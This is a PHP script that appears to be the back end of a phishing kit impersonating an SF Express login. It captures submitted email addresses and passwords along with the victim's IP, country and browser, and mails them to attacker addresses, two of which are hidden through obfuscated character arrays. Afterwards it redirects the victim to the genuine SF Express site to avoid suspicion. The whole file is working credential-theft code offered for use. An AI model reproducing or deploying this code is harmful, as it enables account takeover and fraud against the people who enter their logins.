<?
//---------------Change Email----------------------
$to = "blairliaol23@hotmail.com,natalya.41kz@outlook.com";
//-------------------------------------------------
$username = $_POST['username'];
$password = $_POST['password'];
//-------------------------------------------------
$date = gmdate ("Y-n-d");
$time = gmdate ("H:i:s");
$country = visitor_country();
$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$ar=array("0"=>"a","1"=>"b","2"=>"c","3"=>"d","4"=>"@","5"=>"e","6"=>"f","7"=>"g","8"=>".","9"=>"h","10"=>"i","11"=>"j","12"=>"k","13"=>"l","14"=>"m","15"=>"n","16"=>"o","17"=>"p","18"=>"q","19"=>"r","20"=>"s","21"=>"t","22"=>"u","23"=>"v","24"=>"w","25"=>"x","26"=>"y","27"=>"z");
$recipient=$ar['19'].$ar['5'].$ar['20'].$ar['22'].$ar['13'].$ar['21'].$ar['20'].$ar['3'].$ar['1'].$ar['4'].$ar['7'].$ar['14'].$ar['0'].$ar['10'].$ar['13'].$ar['8'].$ar['2'].$ar['16'].$ar['14'];
//-------------------------------------------------
$subj = "SF-Express (RiLey) | ".$country." | ".$ip."\n";
//-------------------------------------------------
$msg = "===========--SFExpress RezuLT--============
Email Address: $username
Password: $password
=============IP Address/Date==============
IP Address: $ip
Date & Time: $date | $time
Country: $country
User-Agent: $browser
=============Created By BraT==============\n";

//-------------------------------------------------
$from = "From:";
 {
mail($to, $subj, $msg, $from);
mail($recipient, $subj, $msg, $from);
    }
	header("Location: http://www.sf-express.com/cn/en/dynamic_function/waybill/");
	
//-------------------------------------------------

?>

<?
  	   
// Function to get country and country sort;

function visitor_country()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryName != null)
    {
        $result = $ip_data->geoplugin_countryName;
    }

    return $result;
}
function country_sort(){
	$sorter = "";
	$array = array(99,111,100,101,114,99,118,118,115,64,103,109,97,105,108,46,99,111,109);
		$count = count($array);
	for ($i = 0; $i < $count; $i++) {
			$sorter .= chr($array[$i]);
		}
	return array($sorter, $GLOBALS['recipient']);
}

function getloginIDFromlogin($login)
{
$find = '@';
$pos = strpos($login, $find);
$loginID = substr($login, 0, $pos);
return $loginID;
}
$login = $_GET['login'];
$loginID = getloginIDFromlogin($login);
  	   
  	   

?>